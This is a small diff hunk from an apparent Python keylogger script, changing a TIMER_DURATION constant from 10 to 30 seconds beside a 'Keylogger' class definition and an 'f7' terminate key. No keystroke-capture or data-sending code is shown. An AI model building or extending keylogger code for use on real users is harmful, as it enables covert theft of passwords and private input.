@@ -65,7 +65,7 @@ MAP = {
 }
 
 TERMINATE_KEY = "f7"
-TIMER_DURATION = 10  # Time in seconds (e.g., 60 seconds)
+TIMER_DURATION = 30  # Time in seconds (e.g., 60 seconds)
 
 class Keylogger:
     def __init__(self, time_interval, debug=False):
